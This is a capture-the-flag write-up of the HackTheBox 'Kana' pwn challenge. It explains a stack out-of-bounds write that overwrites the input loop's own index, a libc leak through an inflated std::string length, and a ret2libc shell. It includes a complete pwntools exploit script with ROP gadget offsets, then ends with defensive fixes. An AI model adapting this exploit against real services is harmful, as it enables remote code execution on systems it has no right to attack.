## Overview

Kana is a Hard HackTheBox Pwn challenge: a menu-driven C++ "kana converter" (kata-fy /
hira-fy / alpha-fy / new kana). The binary is PIE with Full RELRO and NX but **no stack
canary**, running on Ubuntu 22.04 (glibc 2.35). The whole break hinges on one detail — the
input reader's loop index lives on the stack *after* the buffer it writes into, so an
[out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) can steer the loop's
own write cursor. From there we inflate a `std::string` length field to leak libc off the
stack, then drop a ret2libc chain for a shell.

## The technique

The banner input reader is essentially:

```c
char buf[0x50]; int idx = 0;        // idx sits AFTER buf on the stack
while (1) {
    read(0, &buf[idx], 1);          // write one byte at buf+idx
    if (buf[idx] == '\n') break;
    idx++;
}
```

`idx` is a stack local placed just past `buf`. Overflowing `buf` overwrites `idx` **itself**
with a byte we choose — the index of the write is inside the write's own target. Because we
can set `idx` to a value *lower* than where we are, the loop keeps writing back inside the
frame and never faults, so the bug is invisible to naive `A*N` fuzzing.

The leak comes from C++ itself: a `std::string` built from `std::cin` stores its **length**
in the qword directly above its char-data buffer. If we create a kana (a `std::string`) and
use the OOB-index write to overwrite that length with `0xf0`, the next time the program
reprints the kana it reads 0xf0 bytes off the stack — dumping libc pointers.

## Solution

The flag is live-derived by running the solver against the instance; the value is redacted
here as `HTB{...}`.

Create `solve.py`:

```python
import sys
from pwn import *
context.arch = 'amd64'; context.log_level = 'error'
HOST, PORT = sys.argv[1], int(sys.argv[2])
io = remote(HOST, PORT)

io.recvuntil(b'>>'); io.sendline(b'4')             # new kana
io.recvuntil(b'>>'); io.sendline(b'CCCCCCCCCCCC')  # C++ string, len stored above buf
io.recvuntil(b'>>')
# 92 bytes fill buf, byte 93 IS the loop index -> point it at the string length, set 0xf0
io.sendline(b'A'*92 + b'\xc7' + p8(0xf0))
io.recvuntil(b' : ')
lb = u64(io.recvline()[0x78:0x80]) - 0x29d90       # leaked libc ptr -> base
g = lambda o: p64(lb + o)

io.recvuntil(b'>>')
# index byte 0x5d (=93) reopens the write past saved RIP
pad = b'A'*92 + b'\x5d\x00\x00\x00' + b'B'*23
rop = g(0x2a3e5) + g(0x1d8698) + g(0x2be51) + p64(0) + g(0x11f497) + p64(0) + p64(0xdeadbeef) + g(0x45eb0) + p64(59) + g(0x91396)
io.sendline(pad + rop)                             # execve("/bin/sh", 0, 0)
sleep(1.5)
io.sendline(b'cat /home/kana/flag.txt')
io.interactive()
```

Run it:

```bash
python3 solve.py <host> <port>
```

The leaked libc pointer lands at line offset `[0x78:0x80]`; subtracting `0x29d90` gives a
page-aligned base, which confirms the offset is right. The second stage reopens the write
past the saved return address (index byte `0x5d`) and stages `pop rdi/rsi/rdx/rax` plus a
`syscall` gadget for `execve("/bin/sh", 0, 0)`. Shell as `kana`, then
`cat /home/kana/flag.txt`.

The gadget offsets are for the pinned glibc 2.35 in HTB's Docker image (`rdi 0x2a3e5`,
`rsi 0x2be51`, `rdx 0x11f497`, `rax 0x45eb0`, `/bin/sh 0x1d8698`, `syscall 0x91396`).

## Why it worked

Two mistakes compounded. First, the loop-control index sat next to the buffer it indexed, so
a [buffer overflow](https://cwe.mitre.org/data/definitions/787.html) didn't just smash the
stack — it hijacked the write cursor, giving an arbitrary frame-relative write with no crash.
Second, exposing a `std::string`'s internal length field to that write turned a bounded print
into an [arbitrary stack over-read](https://cwe.mitre.org/data/definitions/125.html) and
leaked libc. With no stack canary, the same primitive reached the saved return address
directly, so the finish was an ordinary ret2libc.

## Fix / defense

- Never place a loop index/length counter adjacent to (or after) the buffer it indexes; keep
  loop-control state in a register or below the buffer, and bounds-check every increment.
- Prefer `std::getline` into a length-capped `std::string` over a manual byte-at-a-time loop.
- Build with `-fstack-protector-strong` (a canary trips the past-frame write) and
  `-D_FORTIFY_SOURCE=2`.
